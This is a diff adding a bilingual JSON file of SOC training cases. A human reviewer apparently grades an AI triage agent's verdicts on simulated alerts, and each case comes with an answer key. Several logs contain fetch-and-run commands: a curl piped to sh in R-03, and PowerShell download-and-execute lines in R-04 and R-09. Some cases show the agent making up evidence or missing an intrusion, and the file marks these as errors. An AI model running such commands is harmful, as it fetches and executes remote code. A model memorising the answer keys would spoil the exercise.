@@ -1,0 +1,257 @@
+{
+  "id": "R",
+  "tema": { "es": "Revisión del agente de IA", "en": "AI agent review" },
+  "casos": [
+    {
+      "id": "R-01", "hora": "07:12", "sev": "alta", "fuente": "Proxy",
+      "regla": { "es": "Envío de credenciales a un dominio recién registrado", "en": "Credentials posted to a newly registered domain" },
+      "titulo": { "es": "Una cuenta de Marketing envía un formulario a un dominio de cinco días", "en": "A Marketing account submits a form to a five-day-old domain" },
+      "resumen": { "es": "El proxy ve un POST a un dominio que imita el portal de Microsoft, minutos después de un correo con enlace.", "en": "The proxy sees a POST to a domain imitating the Microsoft portal, minutes after an email with a link." },
+      "logs": [
+        ["07:05:41", "mail", "delivered from=avisos@cuenta-segura.example to=j.romero subject=\"Tu contraseña caduca hoy\" url=https://login-norte-office.example/reset"],
+        ["07:08:02", "proxy01", "GET https://login-norte-office.example/reset user=j.romero src=10.20.4.12 status=200 category=newly_registered age_days=5"],
+        ["07:08:37", "proxy01", "POST https://login-norte-office.example/reset user=j.romero src=10.20.4.12 status=302 bytes_out=1840"],
+        ["07:10:15", "entra", "signin OK user=j.romero ip=198.51.100.88 geo=NL app=Exchange Online mfa=satisfied_by_token"],
+        ["07:11:03", "entra", "mailbox rule created user=j.romero ip=198.51.100.88 name=\".\" action=move_to_RSS_feeds"]
+      ],
+      "ruido": { "fuentes": ["proxy", "fw", "entra"], "n": 7 },
+      "veredicto": "vp", "accion": "contener",
+      "agente": {
+        "veredicto": "vp", "accion": "contener", "confianza": 91,
+        "razonamiento": { "es": "Correo de suplantación, POST de credenciales a un dominio de cinco días y, dos minutos después, un inicio de sesión desde una IP de otro país que crea una regla de buzón para esconder correo. La cuenta está comprometida.", "en": "Impersonation email, credentials posted to a five-day-old domain and, two minutes later, a sign-in from a foreign IP that creates a mailbox rule to hide mail. The account is compromised." },
+        "comprobaciones": [
+          { "es": "Antigüedad y categoría del dominio en el proxy", "en": "Domain age and category in the proxy" },
+          { "es": "Inicios de sesión de la cuenta tras el POST", "en": "Account sign-ins after the POST" },
+          { "es": "Reglas de buzón nuevas", "en": "New mailbox rules" }
+        ],
+        "cita": "198.51.100.88"
+      },
+      "error": null,
+      "explica": { "es": "El agente acierta y lo justifica con los registros: credenciales enviadas, inicio de sesión desde fuera y una regla que oculta correo. Revocar sesiones, cambiar la contraseña, borrar la regla y escalar. Aprobar un buen veredicto también es trabajo del revisor.", "en": "The agent is right and backs it with the logs: credentials sent, a sign-in from abroad and a rule that hides mail. Revoke sessions, reset the password, delete the rule and escalate. Approving a good verdict is also the reviewer's job." }
+    },
+    {
+      "id": "R-02", "hora": "07:40", "sev": "media", "fuente": "EDR",
+      "regla": { "es": "Tarea programada creada en un servidor", "en": "Scheduled task created on a server" },
+      "titulo": { "es": "Se crea una tarea programada en SRV-SQL01 de madrugada", "en": "A scheduled task is created on SRV-SQL01 at dawn" },
+      "resumen": { "es": "El EDR registra schtasks.exe creando una tarea que se ejecuta cada noche.", "en": "The EDR records schtasks.exe creating a task that runs every night." },
+      "logs": [
+        ["07:31:10", "itsm", "CHG-2115 approved owner=adm.rvela window=07:00-08:30 host=SRV-SQL01 desc=\"Nueva copia nocturna de la base de pedidos\""],
+        ["07:36:44", "win-SRV-SQL01", "EventID=4624 LogonType=10 TargetUserName=adm.rvela IpAddress=10.20.0.5 WorkstationName=PAW-01"],
+        ["07:38:02", "edr", "process host=SRV-SQL01 user=adm.rvela parent=cmd.exe cmd=\"schtasks /create /tn BackupNocturnoPedidos /tr D:\\scripts\\backup_pedidos.ps1 /sc daily /st 02:00 /ru svc_backup\""],
+        ["07:38:05", "edr", "file host=SRV-SQL01 path=D:\\scripts\\backup_pedidos.ps1 signer=\"Norte Logistica IT\" signed=true"]
+      ],
+      "ruido": { "fuentes": ["win", "fw", "edr"], "n": 6 },
+      "veredicto": "benigno", "accion": "cerrar",
+      "agente": {
+        "veredicto": "vp", "accion": "contener", "confianza": 78,
+        "razonamiento": { "es": "Una tarea programada en un servidor crítico con una cuenta de servicio es una técnica de persistencia habitual (T1053.005). Recomiendo aislar SRV-SQL01 y deshabilitar svc_backup.", "en": "A scheduled task on a critical server with a service account is a common persistence technique (T1053.005). I recommend isolating SRV-SQL01 and disabling svc_backup." },
+        "comprobaciones": [
+          { "es": "Técnica MITRE de la tarea", "en": "MITRE technique of the task" },
+          { "es": "Criticidad del servidor", "en": "Server criticality" }
+        ],
+        "cita": "svc_backup"
+      },
+      "error": "contexto",
+      "explica": { "es": "El agente reconoce bien la técnica pero no mira el contexto: hay un cambio aprobado (CHG-2115) con la misma persona, el mismo servidor y la misma ventana, entra desde la estación segura PAW-01 y el script está firmado por IT. Aislar la base de pedidos habría parado la empresa por un trabajo autorizado. Benigno: se cierra citando el cambio.", "en": "The agent identifies the technique but ignores the context: there is an approved change (CHG-2115) with the same person, server and window, the session comes from the secure PAW-01 workstation and the script is signed by IT. Isolating the orders database would have stopped the business over authorised work. Benign: close quoting the change." }
+    },
+    {
+      "id": "R-03", "hora": "08:05", "sev": "baja", "fuente": "Firewall",
+      "regla": { "es": "Escaneo de puertos desde Internet", "en": "Port scan from the Internet" },
+      "titulo": { "es": "Una IP externa sondea decenas de puertos", "en": "An external IP probes dozens of ports" },
+      "resumen": { "es": "El cortafuegos cuenta más de 300 conexiones bloqueadas desde un mismo origen en dos minutos.", "en": "The firewall counts more than 300 blocked connections from one source in two minutes." },
+      "logs": [
+        ["07:58:10", "fw01", "DENY tcp 198.51.100.77 -> 192.0.2.10 ports=1-1024 count=312 (2m)"],
+        ["07:59:40", "fw01", "ALLOW tcp 198.51.100.77:51544 -> 192.0.2.10:2222 nat=10.20.0.30:22"],
+        ["08:00:02", "win-SRV-SQL01", "sshd Accepted password for svc_admin from 198.51.100.77 port 51544"],
+        ["08:01:30", "edr", "process host=SRV-SQL01 user=svc_admin parent=sshd cmd=\"curl -s http://203.0.113.90/k.sh | sh\""]
+      ],
+      "ruido": { "fuentes": ["fw", "proxy"], "n": 8 },
+      "veredicto": "vp", "accion": "contener",
+      "agente": {
+        "veredicto": "vp", "accion": "cerrar", "confianza": 88,
+        "razonamiento": { "es": "Reconocimiento automático desde Internet: el cortafuegos bloqueó las 312 conexiones. Es ruido de fondo habitual. Se documenta y se cierra.", "en": "Automated reconnaissance from the Internet: the firewall blocked all 312 connections. It is usual background noise. Document and close." },
+        "comprobaciones": [
+          { "es": "Acción del cortafuegos sobre el escaneo", "en": "Firewall action on the scan" },
+          { "es": "Reputación del origen", "en": "Source reputation" }
+        ],
+        "cita": "count=312"
+      },
+      "error": "omision",
+      "explica": { "es": "El agente solo leyó la primera línea. Justo después, el mismo origen entra por un puerto SSH publicado por error (2222 hacia SRV-SQL01:22), inicia sesión con svc_admin y descarga y ejecuta un script. El escaneo ya no es ruido: es una intrusión. Aislar SRV-SQL01, deshabilitar svc_admin, cerrar la regla de NAT y escalar.", "en": "The agent only read the first line. Right after, the same source gets in through an SSH port published by mistake (2222 to SRV-SQL01:22), signs in as svc_admin and downloads and runs a script. The scan is no longer noise: it is an intrusion. Isolate SRV-SQL01, disable svc_admin, remove the NAT rule and escalate." }
+    },
+    {
+      "id": "R-04", "hora": "08:32", "sev": "alta", "fuente": "EDR",
+      "regla": { "es": "PowerShell con comando codificado", "en": "PowerShell with an encoded command" },
+      "titulo": { "es": "PowerShell codificado en un equipo del almacén", "en": "Encoded PowerShell on a warehouse PC" },
+      "resumen": { "es": "El EDR ve powershell.exe con -enc lanzado desde el Explorador en PC-ALM-021.", "en": "The EDR sees powershell.exe with -enc launched from Explorer on PC-ALM-021." },
+      "logs": [
+        ["08:28:51", "edr", "process host=PC-ALM-021 user=l.moreno parent=explorer.exe cmd=\"powershell -nop -w hidden -enc SQBFAFgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADUALwBhACkA\" signed=false"],
+        ["08:28:52", "edr", "decoded host=PC-ALM-021 text=\"IEX(iwr http://203.0.113.55/a)\""],
+        ["08:28:54", "proxy01", "GET http://203.0.113.55/a user=l.moreno src=10.20.2.21 status=200 bytes_in=48211 category=uncategorized"],
+        ["08:29:30", "fw01", "ALLOW tcp 10.20.2.21:50433 -> 203.0.113.55:443 interval=60s"]
+      ],
+      "ruido": { "fuentes": ["edr", "proxy", "fw"], "n": 7 },
+      "veredicto": "vp", "accion": "contener",
+      "agente": {
+        "veredicto": "benigno", "accion": "cerrar", "confianza": 84,
+        "razonamiento": { "es": "El script está firmado por Norte Logística y coincide con la tarea de inventario INV-2231 que IT despliega en el almacén. Actividad administrativa autorizada.", "en": "The script is signed by Norte Logística and matches inventory task INV-2231 that IT deploys in the warehouse. Authorised admin activity." },
+        "comprobaciones": [
+          { "es": "Firma del script", "en": "Script signature" },
+          { "es": "Tareas de IT en el almacén", "en": "IT tasks in the warehouse" }
+        ],
+        "cita": "INV-2231"
+      },
+      "error": "alucinacion",
+      "explica": { "es": "El agente se inventa la evidencia: en los registros no aparece INV-2231 por ningún lado y el EDR dice signed=false. Lo que sí hay es un comando que, decodificado, descarga y ejecuta código de 203.0.113.55, y una conexión que vuelve cada 60 segundos: una baliza. Revisar que lo que cita el agente exista de verdad es lo primero. Aislar PC-ALM-021, bloquear la IP y escalar.", "en": "The agent made up the evidence: INV-2231 appears nowhere in the logs and the EDR says signed=false. What is there is a command that, decoded, downloads and runs code from 203.0.113.55, and a connection that comes back every 60 seconds: a beacon. Checking that what the agent cites really exists comes first. Isolate PC-ALM-021, block the IP and escalate." }
+    },
+    {
+      "id": "R-05", "hora": "09:10", "sev": "media", "fuente": "SIEM",
+      "regla": { "es": "Muchas conexiones internas a puertos de administración", "en": "Many internal connections to admin ports" },
+      "titulo": { "es": "SCAN-01 recorre los servidores por SMB, RDP y SSH", "en": "SCAN-01 sweeps the servers over SMB, RDP and SSH" },
+      "resumen": { "es": "Un mismo origen interno abre conexiones a los puertos 22, 445 y 3389 de todos los servidores.", "en": "One internal source opens connections to ports 22, 445 and 3389 on every server." },
+      "logs": [
+        ["08:55:00", "itsm", "CHG-2120 approved owner=adm.rvela window=09:00-11:00 source=10.20.5.15 desc=\"Escaneo mensual de vulnerabilidades autenticado\""],
+        ["09:01:12", "fw01", "ALLOW tcp 10.20.5.15 -> 10.20.0.0/24 ports=22,445,3389 count=96"],
+        ["09:02:40", "win-SRV-DC01", "EventID=4624 LogonType=3 TargetUserName=svc_scan IpAddress=10.20.5.15 WorkstationName=SCAN-01"],
+        ["09:05:18", "win-SRV-FS01", "EventID=4624 LogonType=3 TargetUserName=svc_scan IpAddress=10.20.5.15 WorkstationName=SCAN-01"]
+      ],
+      "ruido": { "fuentes": ["win", "fw", "dc"], "n": 6 },
+      "veredicto": "benigno", "accion": "cerrar",
+      "agente": {
+        "veredicto": "benigno", "accion": "cerrar", "confianza": 95,
+        "razonamiento": { "es": "El origen es SCAN-01, la cuenta es svc_scan y todo ocurre dentro de la ventana del cambio CHG-2120 aprobado para el escaneo mensual. Benigno: se cierra citando el cambio.", "en": "The source is SCAN-01, the account is svc_scan and everything happens within the window of change CHG-2120, approved for the monthly scan. Benign: close quoting the change." },
+        "comprobaciones": [
+          { "es": "Cambio aprobado: origen, ventana y responsable", "en": "Approved change: source, window and owner" },
+          { "es": "Cuenta usada en los inicios de sesión", "en": "Account used for the sign-ins" }
+        ],
+        "cita": "CHG-2120"
+      },
+      "error": null,
+      "explica": { "es": "Veredicto correcto y bien razonado: origen, cuenta y ventana coinciden con un cambio aprobado. Aprobarlo rápido también cuenta: el revisor no está para desconfiar de todo, sino para encontrar lo que el agente no vio.", "en": "Correct and well-reasoned verdict: source, account and window match an approved change. Approving it quickly counts too: the reviewer is not there to distrust everything, but to find what the agent missed." }
+    },
+    {
+      "id": "R-06", "hora": "09:47", "sev": "alta", "fuente": "Microsoft 365",
+      "regla": { "es": "Descarga masiva desde SharePoint", "en": "Mass download from SharePoint" },
+      "titulo": { "es": "Una persona de Finanzas descarga 2 300 documentos en diez minutos", "en": "A Finance employee downloads 2,300 documents in ten minutes" },
+      "resumen": { "es": "La regla salta con más de 500 descargas por hora de una misma cuenta.", "en": "The rule fires on more than 500 downloads per hour from one account." },
+      "logs": [
+        ["09:31:02", "entra", "signin OK user=m.ortega ip=10.20.3.33 device=PC-FIN-003 compliant=true mfa=satisfied"],
+        ["09:35:10", "m365", "FileDownloaded user=m.ortega site=/sites/Finanzas/Contratos count=2312 (10m) client=OneDrive sync"],
+        ["09:44:51", "m365", "FileUploaded user=m.ortega target=personal-drive.example/m.ortega count=640"],
+        ["09:45:30", "rrhh", "m.ortega notice_period=true last_day=2026-11-20"]
+      ],
+      "ruido": { "fuentes": ["entra", "proxy", "win"], "n": 6 },
+      "veredicto": "vp", "accion": "escalar",
+      "agente": {
+        "veredicto": "vp", "accion": "contener", "confianza": 87,
+        "razonamiento": { "es": "Exfiltración de contratos a un almacenamiento personal. Recomiendo deshabilitar ya la cuenta de m.ortega, bloquear PC-FIN-003 y avisarle de que su acceso queda suspendido.", "en": "Exfiltration of contracts to personal storage. I recommend disabling m.ortega's account now, blocking PC-FIN-003 and telling her that her access is suspended." },
+        "comprobaciones": [
+          { "es": "Volumen de descargas", "en": "Download volume" },
+          { "es": "Destino de las subidas", "en": "Upload destination" }
+        ],
+        "cita": "personal-drive.example"
+      },
+      "error": "persona",
+      "explica": { "es": "El veredicto es correcto, la acción no. No hay ningún indicio de compromiso: entra desde su equipo, con MFA y en la oficina. Es una persona de la casa que se va el día 20, y eso implica a RR. HH., a asesoría jurídica y a protección de datos. Un N1 no deshabilita la cuenta ni avisa a la persona por su cuenta: puede alertarla y destruir pruebas. Se escala con todas las evidencias.", "en": "The verdict is right, the action is not. There is no sign of compromise: she signs in from her own PC, with MFA, in the office. She is an employee leaving on the 20th, which involves HR, legal and data protection. T1 does not disable the account or warn the person alone: it can tip her off and destroy evidence. Escalate with all the evidence." }
+    },
+    {
+      "id": "R-07", "hora": "10:20", "sev": "media", "fuente": "Threat intel",
+      "regla": { "es": "Conexión a IP con mala reputación", "en": "Connection to a bad-reputation IP" },
+      "titulo": { "es": "Varios equipos se conectan a una IP con puntuación de riesgo 95", "en": "Several hosts connect to an IP with risk score 95" },
+      "resumen": { "es": "La fuente de inteligencia marca la IP como maliciosa desde esta mañana.", "en": "The threat intel feed has flagged the IP as malicious since this morning." },
+      "logs": [
+        ["10:02:11", "ti", "indicator ip=198.51.100.140 score=95 first_seen=2026-11-09 tags=\"shared hosting\" source=feed-abierta"],
+        ["10:05:44", "proxy01", "GET https://updates.impresoras.example/firmware/manifest.json user=svc_print src=10.20.0.50 status=200 resolved=198.51.100.140"],
+        ["10:05:47", "proxy01", "GET https://updates.impresoras.example/firmware/fw-4.2.1.bin user=svc_print src=10.20.0.50 status=200 sha256_match=true signer=\"Impresoras Ejemplo SA\""],
+        ["10:12:30", "proxy01", "GET https://updates.impresoras.example/firmware/manifest.json user=svc_print src=10.20.0.51 status=200 resolved=198.51.100.140"]
+      ],
+      "ruido": { "fuentes": ["proxy", "fw", "dns"], "n": 7 },
+      "veredicto": "fp", "accion": "cerrar",
+      "agente": {
+        "veredicto": "vp", "accion": "contener", "confianza": 81,
+        "razonamiento": { "es": "La IP tiene una puntuación de riesgo de 95 en la fuente de inteligencia. Dos equipos internos se conectan a ella: hay que aislarlos y bloquear la IP.", "en": "The IP has a risk score of 95 in the threat intel feed. Two internal hosts connect to it: isolate them and block the IP." },
+        "comprobaciones": [
+          { "es": "Puntuación de la IP en la fuente de inteligencia", "en": "IP score in the threat intel feed" }
+        ],
+        "cita": "score=95"
+      },
+      "error": "fuente",
+      "explica": { "es": "El agente se fía de un solo indicador. La IP es de un alojamiento compartido (lo dice la propia etiqueta), entró en la lista hoy, y lo que hacen los equipos es descargar la actualización firmada de las impresoras desde el dominio del fabricante, con el hash correcto. Falso positivo: se cierra y se propone excluir el dominio del fabricante. Una reputación es una pista, no una prueba.", "en": "The agent trusts a single indicator. The IP is shared hosting (its own tag says so), it joined the list today, and what the hosts do is download the printers' signed update from the vendor's domain, with the right hash. False positive: close and propose excluding the vendor's domain. A reputation score is a lead, not proof." }
+    },
+    {
+      "id": "R-08", "hora": "11:05", "sev": "alta", "fuente": "Entra ID",
+      "regla": { "es": "Muchas solicitudes de MFA rechazadas", "en": "Many MFA requests denied" },
+      "titulo": { "es": "Catorce avisos de MFA rechazados y, al final, uno aprobado", "en": "Fourteen MFA prompts denied and, in the end, one approved" },
+      "resumen": { "es": "La cuenta de un comercial recibe avisos de MFA seguidos desde una IP externa.", "en": "A sales rep's account receives back-to-back MFA prompts from an external IP." },
+      "logs": [
+        ["10:48:02", "entra", "signin FAILED user=c.prieto ip=203.0.113.150 reason=mfa_denied count=14 (12m)"],
+        ["11:00:41", "entra", "signin OK user=c.prieto ip=203.0.113.150 mfa=approved device=unknown"],
+        ["11:01:10", "entra", "mfa method added user=c.prieto method=authenticator device=\"Android-7781\" ip=203.0.113.150"],
+        ["11:02:55", "m365", "MailItemsAccessed user=c.prieto ip=203.0.113.150 count=318"]
+      ],
+      "ruido": { "fuentes": ["entra", "proxy"], "n": 6 },
+      "veredicto": "vp", "accion": "contener",
+      "agente": {
+        "veredicto": "vp", "accion": "contener", "confianza": 93,
+        "razonamiento": { "es": "Fatiga de MFA: tras catorce rechazos, la persona aprueba uno. Desde la misma IP se registra un método de MFA nuevo y se leen 318 correos. Revocar sesiones, quitar el método añadido, restablecer la contraseña y escalar.", "en": "MFA fatigue: after fourteen denials, the person approves one. From the same IP a new MFA method is registered and 318 emails are read. Revoke sessions, remove the added method, reset the password and escalate." },
+        "comprobaciones": [
+          { "es": "Secuencia de rechazos y aprobación", "en": "Sequence of denials and approval" },
+          { "es": "Métodos de MFA añadidos", "en": "MFA methods added" },
+          { "es": "Actividad en el buzón tras el acceso", "en": "Mailbox activity after access" }
+        ],
+        "cita": "Android-7781"
+      },
+      "error": null,
+      "explica": { "es": "Correcto y completo: el agente encadena los rechazos, la aprobación, el método nuevo (persistencia) y el acceso al buzón. Aprobar.", "en": "Correct and complete: the agent chains the denials, the approval, the new method (persistence) and the mailbox access. Approve." }
+    },
+    {
+      "id": "R-09", "hora": "11:40", "sev": "media", "fuente": "Correo",
+      "regla": { "es": "Adjunto malicioso detectado", "en": "Malicious attachment detected" },
+      "titulo": { "es": "La pasarela pone en cuarentena una factura con macros", "en": "The gateway quarantines an invoice with macros" },
+      "resumen": { "es": "Un correo con un .docm llega a Comercial y la pasarela lo marca como malicioso.", "en": "An email with a .docm reaches Sales and the gateway flags it as malicious." },
+      "logs": [
+        ["11:21:05", "mail", "quarantined from=facturas@proveedor-transportes.example to=a.garcia attachment=factura_1187.docm verdict=malicious"],
+        ["11:21:05", "mail", "delivered from=facturas@proveedor-transportes.example to=c.prieto attachment=factura_1187.docm verdict=unknown policy=sales_bypass"],
+        ["11:33:48", "edr", "process host=PC-COM-004 user=c.prieto parent=WINWORD.EXE cmd=\"powershell -w hidden -c iwr http://203.0.113.71/s.ps1|iex\""],
+        ["11:33:52", "fw01", "ALLOW tcp 10.20.4.30:50812 -> 203.0.113.71:80"]
+      ],
+      "ruido": { "fuentes": ["mail", "proxy", "fw"], "n": 7 },
+      "veredicto": "vp", "accion": "contener",
+      "agente": {
+        "veredicto": "vp", "accion": "cerrar", "confianza": 90,
+        "razonamiento": { "es": "Ataque real pero frenado: la pasarela puso el correo en cuarentena antes de que llegara al buzón. Se documenta y se cierra.", "en": "A real attack but stopped: the gateway quarantined the email before it reached the mailbox. Document and close." },
+        "comprobaciones": [
+          { "es": "Acción de la pasarela sobre el correo", "en": "Gateway action on the email" }
+        ],
+        "cita": "quarantined"
+      },
+      "error": "omision",
+      "explica": { "es": "El mismo correo llegó a un segundo destinatario por una excepción de la política de Comercial, se abrió y Word lanzó PowerShell, que descargó y ejecutó un script. Revisar a todos los destinatarios, no solo al primero. Aislar PC-COM-004, bloquear la IP y el dominio, purgar el correo de todos los buzones y escalar.", "en": "The same email reached a second recipient through a Sales policy exception, was opened and Word launched PowerShell, which downloaded and ran a script. Check every recipient, not just the first. Isolate PC-COM-004, block the IP and the domain, purge the email from every mailbox and escalate." }
+    },
+    {
+      "id": "R-10", "hora": "12:15", "sev": "media", "fuente": "Correo",
+      "regla": { "es": "Reenvío de documentos a un dominio personal", "en": "Documents forwarded to a personal domain" },
+      "titulo": { "es": "Facturas de clientes reenviadas a un correo personal", "en": "Customer invoices forwarded to a personal email" },
+      "resumen": { "es": "Una cuenta del almacén reenvía 40 facturas con datos bancarios a un buzón externo.", "en": "A warehouse account forwards 40 invoices with bank details to an external mailbox." },
+      "logs": [
+        ["12:02:30", "entra", "signin OK user=l.moreno ip=10.20.2.21 device=PC-ALM-021 compliant=true mfa=satisfied"],
+        ["12:04:12", "mail", "sent from=l.moreno to=lmoreno.casa@correo-personal.example attachments=40 dlp_match=IBAN"],
+        ["12:06:00", "itsm", "no request found user=l.moreno type=export_data"]
+      ],
+      "ruido": { "fuentes": ["mail", "entra", "proxy"], "n": 6 },
+      "veredicto": "vp", "accion": "escalar",
+      "agente": {
+        "veredicto": "vp", "accion": "escalar", "confianza": 86,
+        "razonamiento": { "es": "Datos personales y bancarios enviados a un buzón personal sin petición que lo justifique. Nada indica que la cuenta esté comprometida: es su equipo, con MFA. Implica a una persona y a protección de datos: escalar a N2 con las evidencias, sin contactar con ella.", "en": "Personal and bank data sent to a personal mailbox with no request to justify it. Nothing suggests the account is compromised: it is her PC, with MFA. It involves a person and data protection: escalate to T2 with the evidence, without contacting her." },
+        "comprobaciones": [
+          { "es": "Inicio de sesión y equipo", "en": "Sign-in and device" },
+          { "es": "Coincidencias de DLP", "en": "DLP matches" },
+          { "es": "Peticiones de exportación en ITSM", "en": "Export requests in ITSM" }
+        ],
+        "cita": "dlp_match=IBAN"
+      },
+      "error": null,
+      "explica": { "es": "Correcto: el agente distingue una persona de la casa de una cuenta comprometida y elige escalar. Si son datos personales de clientes, N2 valorará con protección de datos si hay que notificar la brecha a la AEPD en 72 horas.", "en": "Correct: the agent tells an employee apart from a compromised account and chooses to escalate. As it is customers' personal data, T2 will assess with data protection whether the breach must be notified to the regulator within 72 hours." }
+    }
+  ]
+}
